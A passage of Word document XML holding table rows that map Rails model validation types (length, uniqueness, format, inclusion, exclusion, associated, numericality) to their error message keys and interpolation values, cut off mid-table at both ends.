        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="229A100F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">length </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B66E206" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:minimum </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04F9BA1A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:too_short </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B653A94" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="4E0E0125" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1283EF66" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">length </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A83CC88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:maximum </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D4A6B40" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:too_long </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B015B08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="71CF210A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A4ECDF9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">uniqueness </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C4081A8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21BAC65A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:taken </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="155826A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="7194EC24" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32337711" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">format </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B6B9985" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69ED750E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:invalid </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55B09019" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="366CDE8F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="793411D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">inclusion </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D9D738B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C6680DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:inclusion </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="036AE200" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="44FB5D9E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09A2F582" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">exclusion </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4BB142BC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A59FD36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:exclusion </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1953F56F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="1679A547" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A435C5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">associated </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="053BB0E3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DFD980E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:invalid </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64BF35A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="3F1CDF38" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="53C66052" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">numericality </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C6A0739" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">– </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0AA402F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:not_a_number </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51121E2F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="69547B48" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="51AC41A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">numericality </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="585EB8F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:greater_than </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44EAE91F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:greater_than </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02FE1ABD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="48DE09BA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="690A62F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">numericality </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E832DC4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:greater_than_or_equal_to </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="197F8D19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:greater_than_or_equal_to </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D54CA34" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="3DEDF862" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09280070" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">numericality </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5EA57053" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:equal_to </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0BD2FD5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">:equal_to </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="384EB120" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="4C2576C8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
